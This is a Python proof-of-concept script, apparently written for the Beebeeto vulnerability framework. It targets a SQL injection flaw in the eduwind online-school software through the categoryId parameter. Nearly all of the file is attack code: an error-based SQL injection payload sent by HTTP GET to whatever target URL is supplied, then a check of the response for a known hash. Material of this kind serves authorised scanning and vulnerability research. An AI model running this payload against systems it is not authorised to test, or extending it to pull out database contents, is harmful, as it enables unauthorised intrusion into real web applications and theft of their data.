#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': '',
            'name': 'eduwind SQL注入漏洞 POC',
            'author': '独步清风',
            'create_date': '2015-12-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'eduwind',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['eduwind漏洞', '云网校', 'SQL注入漏洞', '/index.php', 'php'],
            'desc': 'eduwind /index.php?r=group/index/category&categoryId=1，categoryId造成了注入',
            'references': ['http://www.wooyun.org/bugs/wooyun-2015-0130891'],
        },
    }

    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = ("/index.php?r=group/index/category&categoryId=1)%20AND%20(SELECT%201%20FROM"
                   "(SELECT%20count(*),CONCAT(FLOOR(RAND(0)*2),(SELECT%20md5(1)))"
                   "x%20from%20information_schema.character_sets%20group%20by%20x)a)%20and(1=1")
        verify_url = url + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] Payload: ' + payload
        content = requests.get(verify_url).content
        if 'c4ca4238a0b923820dcc509a6f75849b' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint
    mp = MyPoc()
    pprint(mp.run())
  